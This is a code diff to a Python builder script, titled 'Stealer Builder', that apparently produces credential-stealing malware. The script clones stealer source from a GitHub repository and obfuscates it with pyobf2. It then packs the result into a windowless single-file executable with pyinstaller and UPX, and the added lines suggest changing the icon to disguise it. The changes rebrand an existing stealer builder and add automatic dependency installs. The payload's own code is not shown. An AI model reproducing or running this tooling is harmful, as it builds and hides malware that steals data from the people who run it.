@@ -5,7 +5,6 @@ import shutil
 import subprocess
 import traceback
 import zipfile
-
 import colorama
 import pyobf2.lib as obf
 import requests
@@ -13,6 +12,29 @@ from InquirerPy import prompt  # type: ignore
 from rich.progress import (BarColumn, Progress, SpinnerColumn, TextColumn,
                            TimeElapsedColumn)
 
+os.system('@echo off')
+os.system('mode con: cols=100 lines=30')
+os.system('title Stealer Builder')
+os.system('color 09')
+
+os.system('cls')
+
+os.system('py -3.10 -m pip install --upgrade psutil')
+os.system('py -3.10 -m pip install --upgrade requests')
+os.system('py -3.10 -m pip install --upgrade wmi')
+os.system('py -3.10 -m pip install --upgrade pycryptodome')
+os.system('py -3.10 -m pip install --upgrade discord')
+os.system('py -3.10 -m pip install --upgrade discord.py')
+os.system('py -3.10 -m pip install --upgrade pillow')
+os.system('py -3.10 -m pip install --upgrade pypiwin32')
+os.system('py -3.10 -m pip install --upgrade tinyaes')
+os.system('py -3.10 -m pip install --upgrade wheel')
+os.system('py -3.10 -m pip install --upgrade pyinstaller')
+os.system('py -3.10 -m pip install --upgrade InquirerPy')
+os.system('py -3.10 -m pip install --upgrade rich')
+os.system('py -3.10 -m pip install --upgrade pyobf2==1.1.5')
+
+os.system('cls')
 
 class Config:
     """
@@ -95,9 +117,9 @@ class MakeEnv:
         Clones the source code from a specified repository into the build directory
         """
         subprocess.run(
-            ['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ['git', 'clone', 'https://github.com/Ba1in/Stealer.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         shutil.move(os.path.join(self.build_dir,
-                    'empyrean', 'src'), self.build_dir)
+                    'Stealer', 'src'), self.build_dir)
 
 
 class WriteConfig:
@@ -207,7 +229,7 @@ class Build:
         """
         subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(
             self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'src', 'main.py')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
+        
 
 def main() -> None:
     colorama.init()
@@ -224,23 +246,23 @@ def main() -> None:
     config_data = config.get_config()
 
     with progress:
-        task1 = progress.add_task("[bold green]Making environment...", total=1)
+        task1 = progress.add_task("[bold blue]Making environment...", total=1)
         make_env = MakeEnv()
         make_env.make_env()
         make_env.get_src()
         progress.update(task1, advance=1)
 
-        task2 = progress.add_task("[bold green]Writing config...", total=1)
+        task2 = progress.add_task("[bold blue]Writing config...", total=1)
         write_config = WriteConfig(config_data)
         write_config.write_config()
         progress.update(task2, advance=1)
 
-        task3 = progress.add_task("[bold green]Obfuscating...", total=1)
+        task3 = progress.add_task("[bold blue]Obfuscating...", total=1)
         do_obfuscate = DoObfuscate()
         do_obfuscate.run()
         progress.update(task3, advance=1)
 
-        task4 = progress.add_task("[bold green]Building...", total=1)
+        task4 = progress.add_task("[bold blue]Building...", total=1)
         build = Build()
         build.get_pyinstaller()
         build.get_upx()
@@ -248,7 +270,9 @@ def main() -> None:
         progress.update(task4, advance=1)
 
     print('Done!')
-
+    print('Edited by @ba1in / Balin#0093')
+    print('You can find the executable in the dist folder')
+    print('Change the icon using Resource Hacker http://www.angusj.com/resourcehacker/')
 
 if __name__ == '__main__':
     main()
